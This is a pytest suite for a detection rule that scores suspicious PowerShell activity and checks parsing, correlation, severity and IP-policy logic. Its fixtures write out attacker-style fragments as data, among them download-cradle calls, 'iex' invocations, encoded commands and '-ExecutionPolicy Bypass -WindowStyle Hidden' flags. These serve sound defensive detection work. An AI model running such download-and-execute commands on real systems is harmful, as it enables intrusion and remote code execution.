"""Phase 5 tests: DET-002 suspicious PowerShell detection."""

from __future__ import annotations

import pytest
from detection_helpers import (
    Factory, encode_command, findings_of, summary_of, user_context)

from security.detection import DetectionConfig, IpPolicy, PowerShellConfig
from security.detection.config import POWERSHELL_INDICATORS
from security.detection.powershell import decode_encoded_command, flag_values, tokenize
from security.models.schemas import Confidence, Severity

B64 = encode_command("Get-Date")


def ps(result):
    return findings_of(result, "DET-002")


def config(**kwargs) -> DetectionConfig:
    return DetectionConfig(powershell=PowerShellConfig(**kwargs))


def indicators_of(finding) -> set[str]:
    return {m["indicator"] for m in finding.matched_indicators}


def single(f: Factory, name: str, pid: int = 500, t: float = 0, user: str = "ahmed"):
    """Events that trigger exactly ONE indicator."""
    cmd, parent = "powershell.exe -NoProfile", "explorer.exe"
    if name == "encoded_command":
        cmd = f"powershell.exe -enc {B64}"
    elif name == "hidden_window":
        cmd = "powershell.exe -WindowStyle Hidden"
    elif name == "execution_policy_bypass":
        cmd = "powershell.exe -ExecutionPolicy Bypass"
    elif name == "user_writable_script_path":
        cmd = "powershell.exe -File C:\\Users\\Public\\a.ps1"
    elif name == "unusual_parent":
        parent = "wscript.exe"
    process = f.process(t, pid, command_line=cmd, parent=parent, user=user)
    if name == "download_cradle":
        f.script(t + 1, pid, command="Invoke-WebRequest -Uri http://example.net/a", user=user)
    elif name == "invoke_expression":
        f.script(t + 1, pid, command="iex $payload", user=user)
    elif name == "external_connection":
        f.connection(t + 2, pid)
    return process


# ------------------------------------------------------- text helpers
class TestTextHelpers:
    def test_tokenize_removes_quotes_and_keeps_quoted_spaces(self):
        assert tokenize('powershell -File "C:\\My Dir\\a.ps1" \'x y\' z') == [
            "powershell", "-File", "C:\\My Dir\\a.ps1", "x y", "z"]

    def test_flag_values_reads_next_token_or_inline_value(self):
        tokens = tokenize("ps -w hidden -ep:bypass -x")
        assert flag_values(tokens, lambda n: n == "w") == [("-w", "hidden")]
        assert flag_values(tokens, lambda n: n == "ep") == [("-ep:bypass", "bypass")]
        assert flag_values(tokens, lambda n: n == "x") == []     # no value available

    def test_slash_parameters_are_not_parsed(self):
        assert flag_values(tokenize("tool /f value"), lambda n: n == "f") == []

    def test_decode_valid_command(self):
        assert decode_encoded_command(encode_command("Write-Host 'hi'")) == "Write-Host 'hi'"

    @pytest.mark.parametrize("value", [
        "not base64!", "ZZZZZZZZZZZZ",                       # not Base64 / odd byte count
        encode_command("x")[:-2],                            # bad padding
        "AAAAAAAA", "A" * 300_000, ""])
    def test_decode_returns_none_instead_of_raising(self, value):
        assert decode_encoded_command(value) is None

    def test_decode_rejects_non_printable_text(self):
        import base64
        assert decode_encoded_command(base64.b64encode(b"\x00\x00\x01\x00").decode()) is None


# --------------------------------------------- one indicator is not enough
class TestSingleIndicators:
    @pytest.mark.parametrize("name", POWERSHELL_INDICATORS)
    def test_one_indicator_alone_is_not_a_finding(self, name):
        f = Factory()
        single(f, name)
        result = f.run()
        assert ps(result) == []
        assert summary_of(result, "DET-002").data_gaps == []

    @pytest.mark.parametrize("name", POWERSHELL_INDICATORS)
    def test_each_indicator_works_when_one_is_enough(self, name):
        f = Factory()
        single(f, name)
        [finding] = ps(f.run(config(min_indicators=1)))
        assert indicators_of(finding) == {name}
        expected = Severity.MEDIUM if name == "external_connection" else Severity.LOW
        assert finding.severity is expected and finding.confidence is Confidence.LOW

    def test_plain_powershell_is_never_suspicious(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe", parent="explorer.exe")
        f.script(1, 500, command="Get-Process | Sort-Object CPU")
        result = f.run()
        assert ps(result) == []
        assert summary_of(result, "DET-002").events_considered == 2

    def test_noprofile_is_not_an_indicator(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -NoProfile -File C:\\IT\\Scripts\\a.ps1")
        assert ps(f.run(config(min_indicators=1))) == []

    def test_the_word_powershell_in_text_is_not_an_indicator(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe")
        f.script(1, 500, command='Write-Host "powershell is installed"')
        assert ps(f.run(config(min_indicators=1))) == []

    def test_scheduled_admin_script_with_internal_traffic_is_not_flagged(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -NoProfile -File C:\\IT\\disk.ps1",
                  parent="svchost.exe", user="svc_backup")
        f.script(1, 500, command="Get-PSDrive", user="svc_backup",
                 script_path="C:\\IT\\disk.ps1")
        for remote in ("10.0.0.5", "127.0.0.1", "169.254.1.1"):
            f.connection(2, 500, remote=remote, user=None)
        assert ps(f.run()) == []


# --------------------------------------------------------- positive findings
class TestPositive:
    def test_two_indicators_raise_a_complete_finding(self):
        f = Factory()
        process = f.process(
            0, 500, parent="explorer.exe",
            command_line="powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass")
        result = f.run()
        [finding] = ps(result)
        assert finding.finding_id == "F-001" and finding.rule_id == "DET-002"
        assert finding.title == "Suspicious PowerShell Activity"
        assert (finding.severity, finding.confidence) == (Severity.MEDIUM, Confidence.LOW)
        assert (finding.user, finding.device) == ("ahmed", "PC-1")
        assert finding.supporting_events == [process.event_id]
        assert finding.evidence_sources == [process.evidence_id]
        assert finding.evidence_files == ["processes.json"]
        by_name = {m["indicator"]: m for m in finding.matched_indicators}
        assert by_name["hidden_window"]["matched_text"] == "-WindowStyle Hidden"
        assert by_name["execution_policy_bypass"]["matched_text"] == "-ExecutionPolicy Bypass"
        assert by_name["hidden_window"]["field"] == "command_line"
        assert by_name["hidden_window"]["evidence_id"] == process.evidence_id
        process_info = finding.context["process"]
        assert process_info["pid"] == 500 and process_info["parent_name"] == "explorer.exe"
        assert process_info["process_event_id"] == process.event_id
        assert process_info["command_line_available"] is True
        assert finding.context["distinct_indicators"] == 2
        assert "heuristics, not proof" in finding.description
        assert finding.recommended_next_steps == []
        assert finding.iocs == [] and finding.mitre_techniques == []

    def test_indicators_from_different_records_of_one_process_combine(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.script(2, 500, command="Invoke-WebRequest -Uri http://example.net/x")
        [finding] = ps(f.run())
        assert indicators_of(finding) == {"execution_policy_bypass", "download_cradle"}
        assert finding.evidence_files == ["powershell.json", "processes.json"]

    @pytest.mark.parametrize("build, confidence", [
        # 3 indicators, one evidence file -> Medium
        (lambda f: f.process(0, 500, command_line=(
            "powershell.exe -w hidden -ep bypass -File C:\\Users\\Public\\a.ps1")),
         Confidence.MEDIUM),
        # 2 indicators across 2 files -> Medium
        (lambda f: (f.process(0, 500, command_line="powershell.exe -ep bypass"),
                    f.script(1, 500, command="iex $x")), Confidence.MEDIUM),
        # 3 indicators across 2 files -> High
        (lambda f: (f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass"),
                    f.script(1, 500, command="iex $x")), Confidence.HIGH),
    ])
    def test_confidence_scale(self, build, confidence):
        f = Factory()
        build(f)
        [finding] = ps(f.run())
        assert finding.confidence is confidence

    def test_external_connection_raises_severity_one_step(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500)
        [finding] = ps(f.run())
        assert finding.severity is Severity.HIGH
        assert any("outbound connection" in x for x in finding.severity_factors)

    def test_administrator_actor_raises_severity_and_is_cited_as_evidence(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass",
                  context=user_context("ahmed", True, "2025-01-01T00:00:00Z", "USR-0009"))
        [finding] = ps(f.run())
        assert finding.severity is Severity.HIGH
        assert "USR-0009" in finding.evidence_sources
        assert "users.json" in finding.evidence_files
        assert any("Administrators" in x for x in finding.severity_factors)

    def test_standard_user_does_not_raise_severity(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass",
                  context=user_context("ahmed", False, "2025-01-01T00:00:00Z", "USR-0009"))
        [finding] = ps(f.run())
        assert finding.severity is Severity.MEDIUM
        assert "USR-0009" not in finding.evidence_sources

    def test_severity_never_exceeds_high(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass",
                  context=user_context("ahmed", True, "2025-01-01T00:00:00Z"))
        f.connection(5, 500)
        assert ps(f.run())[0].severity is Severity.HIGH

    def test_min_indicators_is_configurable(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass")
        assert ps(f.run(config(min_indicators=2)))
        assert not ps(f.run(config(min_indicators=3)))

    def test_disabled_indicators_are_not_evaluated(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass")
        f.connection(5, 500)
        enabled = tuple(i for i in POWERSHELL_INDICATORS if i != "external_connection")
        [finding] = ps(f.run(config(enabled_indicators=enabled)))
        assert "external_connection" not in indicators_of(finding)
        # with the flag indicators disabled, the connection alone is not enough
        sparse = config(
            enabled_indicators=("external_connection", "download_cradle"))
        assert not ps(f.run(sparse))

    def test_two_processes_give_two_chronological_findings(self):
        f = Factory()
        f.process(100, 600, command_line="powershell.exe -w hidden -ep bypass")
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass")
        first, second = ps(f.run())
        assert (first.context["process"]["pid"], second.context["process"]["pid"]) == (500, 600)
        assert not set(first.supporting_events) & set(second.supporting_events)


# ----------------------------------------------------- flag parsing
def process_with(command_line: str, min_indicators: int = 1):
    f = Factory()
    f.process(0, 500, command_line=command_line)
    return ps(f.run(config(min_indicators=min_indicators)))


class TestFlagParsing:
    @pytest.mark.parametrize("fragment", [
        f"-enc {B64}", f"-e {B64}", f"-ec {B64}", f"-EncodedCommand {B64}",
        f"-EncodedCommand:{B64}", f"-ENCODEDCOMMAND {B64}", f'-enc "{B64}"', f"-en {B64}"])
    def test_encoded_command_variants(self, fragment):
        [finding] = process_with(f"powershell.exe -NoProfile {fragment}")
        assert indicators_of(finding) == {"encoded_command"}

    @pytest.mark.parametrize("fragment", [
        "-e notbase64!", "-enc short", "-enc", "-EncodedCommandX " + B64,
        "-e", "Write-Host -enc"])
    def test_encoded_command_negatives(self, fragment):
        assert process_with(f"powershell.exe {fragment}") == []

    @pytest.mark.parametrize("fragment", [
        "-WindowStyle Hidden", "-w hidden", "-win 1", "-windowstyle:hidden",
        "-WINDOWSTYLE HIDDEN", '-w "hidden"', "-wi Hidden"])
    def test_hidden_window_variants(self, fragment):
        [finding] = process_with(f"powershell.exe {fragment}")
        assert indicators_of(finding) == {"hidden_window"}

    @pytest.mark.parametrize("fragment", [
        "-w normal", "-w minimized", "-WindowStyle Maximized", "-w", "-WindowStyleHidden"])
    def test_hidden_window_negatives(self, fragment):
        assert process_with(f"powershell.exe {fragment}") == []

    @pytest.mark.parametrize("fragment", [
        "-ExecutionPolicy Bypass", "-ep bypass", "-exec bypass", "-ex Bypass",
        "-ExecutionPolicy:Unrestricted", "-EXECUTIONPOLICY bypass", "-ep Unrestricted"])
    def test_execution_policy_variants(self, fragment):
        [finding] = process_with(f"powershell.exe {fragment}")
        assert indicators_of(finding) == {"execution_policy_bypass"}

    @pytest.mark.parametrize("fragment", [
        "-ep RemoteSigned", "-ExecutionPolicy AllSigned", "-ExecutionPolicy",
        "-ExecutionPolicyBypass", "-e bypass", "-NoProfile"])
    def test_execution_policy_negatives(self, fragment):
        assert process_with(f"powershell.exe {fragment}") == []

    def test_policy_and_window_values_are_configurable(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ep RemoteSigned -w minimized")
        assert not ps(f.run())
        custom = config(execution_policy_values=("remotesigned",),
                        hidden_window_values=("minimized",))
        [finding] = ps(f.run(custom))
        assert indicators_of(finding) == {"execution_policy_bypass", "hidden_window"}


# -------------------------------------------------------- script content
def script_with(command: str):
    f = Factory()
    f.process(0, 500, command_line="powershell.exe")
    f.script(1, 500, command=command)
    return ps(f.run(config(min_indicators=1)))


class TestScriptContent:
    @pytest.mark.parametrize("text", [
        "Invoke-WebRequest -Uri http://x/a", "invoke-webrequest http://x", "iwr http://x/a",
        "irm http://x/a", "(New-Object Net.WebClient).DownloadString('http://x')",
        "$c.DownloadFile('a','b')", "$w.DownloadData($u)", "Start-BitsTransfer -Source x",
        "Invoke-RestMethod http://x"])
    def test_download_functions_are_detected(self, text):
        [finding] = script_with(text)
        assert indicators_of(finding) == {"download_cradle"}

    @pytest.mark.parametrize("text", [
        "iwrite", "Invoke-WebRequestX", "my-iwr", "Get-Content download.txt", "pirm",
        "Write-Host 'download'"])
    def test_download_negatives(self, text):
        assert script_with(text) == []

    @pytest.mark.parametrize("text", ["iex $x", "IEX($x)", "Invoke-Expression $x",
                                      "$a | iex"])
    def test_invoke_expression_is_detected(self, text):
        [finding] = script_with(text)
        assert indicators_of(finding) == {"invoke_expression"}

    @pytest.mark.parametrize("text", ["iexplore.exe", "myiex", "Invoke-Expressions", "index"])
    def test_invoke_expression_negatives(self, text):
        assert script_with(text) == []

    def test_custom_patterns_replace_the_defaults(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe")
        f.script(1, 500, command="Invoke-WebRequest x; MyDownloader.Fetch()")
        [finding] = ps(f.run(config(min_indicators=1,
                                    download_patterns=(r"MyDownloader\.Fetch",))))
        assert finding.matched_indicators[0]["matched_text"] == "MyDownloader.Fetch"

    @pytest.mark.parametrize("fragment", [
        "-File C:\\Users\\Public\\x.ps1", "-File C:\\Users\\bob\\AppData\\Local\\Temp\\a.ps1",
        "-File C:/Users/Public/x.ps1", "-f C:\\Users\\bob\\Downloads\\a.ps1",
        "-File:C:\\ProgramData\\a.ps1", '-File "C:\\Users\\Public\\My Scripts\\a.ps1"',
        "-FILE C:\\USERS\\PUBLIC\\X.PS1"])
    def test_writable_script_paths_in_command_lines(self, fragment):
        [finding] = process_with(f"powershell.exe {fragment}")
        assert indicators_of(finding) == {"user_writable_script_path"}

    @pytest.mark.parametrize("fragment", [
        "-File C:\\IT\\Scripts\\a.ps1", "-File C:\\Program Files\\Tool\\a.ps1",
        "-File C:\\Windows\\System32\\a.ps1", "-File C:\\temporary\\a.ps1", "-File"])
    def test_non_writable_script_paths(self, fragment):
        assert process_with(f"powershell.exe {fragment}") == []

    def test_script_path_field_is_checked_too(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe")
        f.script(1, 500, script_path="C:\\Users\\bob\\Downloads\\a.ps1")
        [finding] = ps(f.run(config(min_indicators=1)))
        assert finding.matched_indicators[0]["field"] == "script_path"

    def test_path_fragments_are_configurable(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -File C:\\IT\\Scripts\\a.ps1")
        assert not ps(f.run(config(min_indicators=1)))
        assert ps(f.run(config(min_indicators=1, writable_path_fragments=("\\scripts\\",))))


class TestDecoding:
    def test_decoded_command_is_scanned_for_content_indicators(self):
        encoded = encode_command("Invoke-WebRequest -Uri http://example.net/a; iex $x")
        f = Factory()
        f.process(0, 500, command_line=f"powershell.exe -enc {encoded}")
        [finding] = ps(f.run())
        assert indicators_of(finding) == {"encoded_command", "download_cradle",
                                          "invoke_expression"}
        fields = {m["field"] for m in finding.matched_indicators}
        assert "command_line (decoded)" in fields

    def test_decoded_flags_are_found_too(self):
        encoded = encode_command(
            "powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\a.ps1")
        [finding] = process_with(f"powershell.exe -enc {encoded}")
        assert {"execution_policy_bypass", "user_writable_script_path"} <= indicators_of(finding)

    def test_undecodable_payload_still_counts_as_encoded_and_never_crashes(self):
        [finding] = process_with("powershell.exe -enc ZZZZZZZZZZZZ")
        assert indicators_of(finding) == {"encoded_command"}

    def test_oversized_payload_is_not_decoded(self):
        [finding] = process_with("powershell.exe -enc " + "A" * 300_000)
        assert indicators_of(finding) == {"encoded_command"}

    def test_decoding_is_one_level_deep(self):
        inner = encode_command("Invoke-WebRequest -Uri http://example.net/a")
        outer = encode_command(f"powershell -enc {inner}")
        [finding] = process_with(f"powershell.exe -enc {outer}")
        assert indicators_of(finding) == {"encoded_command"}       # no download_cradle

    def test_matched_text_never_contains_the_payload(self):
        [finding] = process_with(f"powershell.exe -enc {B64}")
        assert B64 not in str(finding.matched_indicators)
        assert "Base64" in finding.matched_indicators[0]["matched_text"]


# -------------------------------------------------------- unusual parent
class TestUnusualParent:
    @pytest.mark.parametrize("parent", ["wscript.exe", "WINWORD.EXE", "mshta.exe",
                                        "cscript.exe", "excel.exe", "outlook.exe"])
    def test_default_unusual_parents(self, parent):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe", parent=parent)
        [finding] = ps(f.run(config(min_indicators=1)))
        assert finding.matched_indicators[0]["matched_text"] == parent

    @pytest.mark.parametrize("parent", ["explorer.exe", "cmd.exe", "svchost.exe", "services.exe"])
    def test_ordinary_parents_are_not_flagged(self, parent):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe", parent=parent)
        assert ps(f.run(config(min_indicators=1))) == []

    def test_unknown_parent_is_a_data_gap_not_a_negative(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe", parent=None)
        result = f.run(config(min_indicators=1))
        assert ps(result) == []
        assert any("no parent_name" in g for g in summary_of(result, "DET-002").data_gaps)

    def test_parent_list_is_configurable(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe", parent="cmd.exe")
        assert ps(f.run(config(min_indicators=1, unusual_parents=("cmd.exe",))))


# --------------------------------------------------- missing evidence fields
class TestMissingData:
    def test_powershell_records_without_a_process_record(self):
        f = Factory()
        f.script(0, 500, command="Invoke-WebRequest http://x/a; iex $y")
        result = f.run()
        [finding] = ps(result)
        assert finding.context["process"]["process_event_id"] is None
        assert finding.context["process"]["command_line_available"] is False
        assert any("no process record for PID 500" in g
                   for g in summary_of(result, "DET-002").data_gaps)

    def test_null_command_line_is_a_gap_and_does_not_hide_script_indicators(self):
        f = Factory()
        f.process(0, 500, command_line=None)
        f.script(1, 500, command="Invoke-WebRequest http://x/a; iex $y")
        result = f.run()
        [finding] = ps(result)
        assert finding.context["process"]["command_line_available"] is False
        assert any("has no command line" in g for g in summary_of(result, "DET-002").data_gaps)

    def test_null_command_line_alone_is_unknown_not_clean(self):
        f = Factory()
        f.process(0, 500, command_line=None, parent="wscript.exe")
        result = f.run()
        assert ps(result) == []                       # only one indicator can be evaluated
        assert summary_of(result, "DET-002").data_gaps

    def test_records_without_a_pid_cannot_be_correlated(self):
        f = Factory()
        f.process(0, None, command_line="powershell.exe -w hidden -ep bypass")
        f.script(1, None, command="iex $x")
        result = f.run()
        assert ps(result) == []
        gaps = " ".join(summary_of(result, "DET-002").data_gaps)
        assert "no pid" in gaps


# ------------------------------------------------ correlation (and its limits)
def with_connection(**kwargs):
    """A process with ONE content indicator plus a connection: fires only if attached."""
    f = Factory()
    f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
    t = kwargs.pop("t", 10)
    pid = kwargs.pop("pid", 500)
    f.connection(t, pid, **kwargs)
    return f


class TestCorrelation:
    def test_connection_with_same_pid_device_and_window_is_attached(self):
        f = with_connection()
        [finding] = ps(f.run())
        assert "external_connection" in indicators_of(finding)
        [link] = finding.context["correlated_records"]
        assert link["link"] == "network_connection"
        assert "same pid 500" in link["basis"] and "same device" in link["basis"]
        assert any("user not available" in b for b in link["basis"])

    @pytest.mark.parametrize("kwargs", [
        {"pid": 501},                                  # other PID
        {"device": "PC-2"},                            # other device
        {"user": "bob"},                               # other user
        {"t": -1},                                     # before the process started
        {"t": 901},                                    # outside the 900 s window
    ], ids=["other-pid", "other-device", "other-user", "before-start", "after-window"])
    def test_connection_that_does_not_match_is_never_attached(self, kwargs):
        result = with_connection(**kwargs).run()
        assert ps(result) == []
        gaps = summary_of(result, "DET-002").data_gaps
        assert any("no matching PowerShell process or script record" in g for g in gaps)

    def test_connection_by_a_different_process_with_the_same_pid_is_ignored(self):
        result = with_connection(process_name="chrome.exe").run()
        assert ps(result) == []
        assert summary_of(result, "DET-002").data_gaps == []      # not PowerShell: not a gap

    def test_inbound_connections_are_ignored(self):
        assert ps(with_connection(direction="inbound").run()) == []

    def test_window_boundary_is_inclusive_and_configurable(self):
        assert ps(with_connection(t=900).run())
        assert not ps(with_connection(t=901).run())
        assert ps(with_connection(t=30).run(config(correlation_window_seconds=30)))
        assert not ps(with_connection(t=31).run(config(correlation_window_seconds=30)))

    def test_user_match_is_recorded_when_both_sides_have_a_user(self):
        [finding] = ps(with_connection(user="ahmed").run())
        assert "same user 'ahmed'" in finding.context["correlated_records"][0]["basis"]

    def test_indicators_are_never_pooled_across_processes_by_closeness(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.process(0, 501, command_line="powershell.exe -WindowStyle Hidden")
        assert ps(f.run()) == []

    def test_indicators_are_never_pooled_across_devices(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass", device="PC-A")
        f.process(0, 500, command_line="powershell.exe -WindowStyle Hidden", device="PC-B")
        assert ps(f.run()) == []

    def test_pid_reuse_attaches_to_the_latest_process_only(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        second = f.process(2000, 500, command_line="powershell.exe -WindowStyle Hidden")
        f.connection(2005, 500)
        [finding] = ps(f.run())
        assert finding.context["process"]["process_event_id"] == second.event_id
        assert indicators_of(finding) == {"hidden_window", "external_connection"}

    def test_script_record_from_another_user_is_not_attached(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass", user="ahmed")
        f.script(1, 500, command="Invoke-WebRequest http://x/a", user="bob")
        result = f.run()
        assert ps(result) == []                       # 1 indicator each, never merged
        assert any("no process record for PID 500" in g
                   for g in summary_of(result, "DET-002").data_gaps)

    def test_script_record_after_the_window_starts_a_new_context(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.script(901, 500, command="Invoke-WebRequest http://x/a")
        assert ps(f.run()) == []

    def test_every_matched_indicator_points_at_a_supporting_event(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -w hidden -ep bypass")
        f.script(1, 500, command="iex $x")
        f.connection(2, 500)
        [finding] = ps(f.run())
        by_id = {e.event_id: e for e in f.events}
        for match in finding.matched_indicators:
            event = by_id[match["event_id"]]
            assert match["event_id"] in finding.supporting_events
            assert match["evidence_id"] == event.evidence_id
            assert match["evidence_file"] == event.evidence_file


# ------------------------------------------------------------- IP policy
class TestExternalConnectionPolicy:
    @pytest.mark.parametrize("remote, external", [
        ("8.8.8.8", True), ("1.1.1.1", True), ("2606:4700::1111", True),
        ("203.0.113.77", False), ("198.51.100.23", False), ("192.0.2.44", False),
        ("2001:db8::1", False),                 # documentation ranges: not external
        ("10.0.0.5", False), ("192.168.1.9", False), ("172.20.0.1", False),
        ("127.0.0.1", False), ("::1", False), ("169.254.7.7", False),
        ("224.0.0.251", False), ("100.64.1.1", False), ("0.0.0.0", False)])
    def test_only_external_classes_count(self, remote, external):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500, remote=remote)
        assert bool(ps(f.run())) is external

    @pytest.mark.parametrize("remote, word", [("not-an-ip", "invalid"), (None, "missing"),
                                              ("999.1.1.1", "invalid"), ("-", "missing")])
    def test_unclassifiable_addresses_are_gaps_not_internal_or_external(self, remote, word):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500, remote=remote)
        result = f.run()
        assert ps(result) == []
        assert any(f"is {word}" in g for g in summary_of(result, "DET-002").data_gaps)

    def test_documentation_ranges_are_not_external_unless_explicitly_enabled(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500, remote="203.0.113.77")
        assert not ps(f.run())                                       # default policy
        assert not ps(f.run(config(ip_policy=IpPolicy.from_classes(["public"]))))
        [finding] = ps(f.run(config(ip_policy=IpPolicy.synthetic_demo())))   # explicit opt-in
        assert "external_connection" in indicators_of(finding)
        assert [m["matched_text"] for m in finding.matched_indicators
                if m["indicator"] == "external_connection"] == ["203.0.113.77:443 (documentation)"]

    def test_private_addresses_can_be_declared_external(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500, remote="10.0.0.5")
        assert not ps(f.run())
        assert ps(f.run(config(ip_policy=IpPolicy.from_classes(["public", "private"]))))

    def test_a_public_address_alone_is_never_a_finding(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -NoProfile")
        f.connection(5, 500, remote="8.8.8.8")
        assert ps(f.run()) == []

    def test_external_class_is_named_in_the_evidence(self):
        f = Factory()
        f.process(0, 500, command_line="powershell.exe -ExecutionPolicy Bypass")
        f.connection(5, 500, remote="8.8.8.8", port=8443)
        [finding] = ps(f.run())
        text = [m["matched_text"] for m in finding.matched_indicators
                if m["indicator"] == "external_connection"]
        assert text == ["8.8.8.8:8443 (public)"]
        assert "public" in finding.context["external_classes"]
